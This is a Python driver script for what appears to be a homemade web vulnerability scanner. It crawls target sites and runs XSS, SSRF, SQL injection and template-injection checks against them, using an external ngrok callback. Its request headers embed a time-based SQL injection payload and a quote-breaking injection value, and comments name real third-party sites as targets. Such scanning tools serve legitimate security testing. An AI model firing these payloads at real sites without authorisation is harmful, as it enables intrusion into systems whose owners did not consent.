import os

import sublist3r
from tldextract import tldextract

from Managers.CacheManager import CacheManager
from Managers.CookieManager import CookieManager
from Managers.Hakrawler import Hakrawler
from Managers.LinksManager import LinksManager
from Managers.FormRequestFetcher import FormRequestFetcher
from Managers.SqliManager import SqliManager
from Managers.SsrfManager import SsrfManager
from Managers.SstiManager import SstiManager
from Managers.XssManager import XssManager

headers = {
    'Cache-Control': 'max-age=0',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'X-Forwarded-For': 'XOR(if(1=1,sleep(5),0))OR',
    'X-API-KEY': 'xapikeypoc\'',
}


def get_start_urls(file_path):
    if os.path.exists(file_path):
        return set(line.strip() for line in open(file_path))


def main():
    max_depth = 1
    download_path = "C:\\Users\\oleksandr oliinyk\\Downloads"
    # start_url = "https://www.deere.com/en/mowers/lawn-tractors/"
    # start_url = "https://oriondemo.solarwinds.com/Orion/SummaryView.aspx?ViewID=1"

    urls = get_start_urls(f'{download_path}\\urls.txt')

    CacheManager.clear_all()

    for start_url in urls:
        # start_url = "https://grameen.clabs.co/"
        ngrok_url = 'http://4d58-212-90-183-35.ngrok.io/'
        domain_parts = tldextract.extract(start_url)
        domain = f'{domain_parts.domain}.{domain_parts.suffix}'

        # subdomains = sublist3r.main(domain, 40, f'SublisterResult/{domain}_subdomains.txt', ports=None, silent=False, verbose=False,
        #                             enable_bruteforce=False, engines=None)

        # CacheManager.clear_all()

        cookie_manager = CookieManager(domain, download_path)
        raw_cookie = cookie_manager.get_raw_cookies()

        # hakrawler = Hakrawler(domain, raw_cookie)
        # get_dtos = hakrawler.get_requests_dtos(start_url)

        cookies_dict = cookie_manager.get_cookies_dict(raw_cookie)
        links_manager = LinksManager(domain, cookies_dict, headers, max_depth)
        get_dtos = links_manager.get_all_links(start_url)

        post_manager = FormRequestFetcher(domain)
        post_dtos = post_manager.get_all_post_requests(get_dtos)

        xss_manager = XssManager(domain, cookies_dict, headers)
        xss_manager.check_get_requests(get_dtos)
        xss_manager.check_form_requests(post_dtos)

        ssrf_manager = SsrfManager(domain, cookies_dict, headers, ngrok_url)
        ssrf_manager.check_get_requests(get_dtos)
        ssrf_manager.check_form_requests(post_dtos)

        sqli_manager = SqliManager(domain, cookies_dict, headers)
        sqli_manager.check_get_requests(get_dtos)

        ssti_manager = SstiManager(domain, cookies_dict, headers)
        ssti_manager.check_get_requests(get_dtos)
        ssti_manager.check_form_requests(post_dtos)


if __name__ == '__main__':
    main()
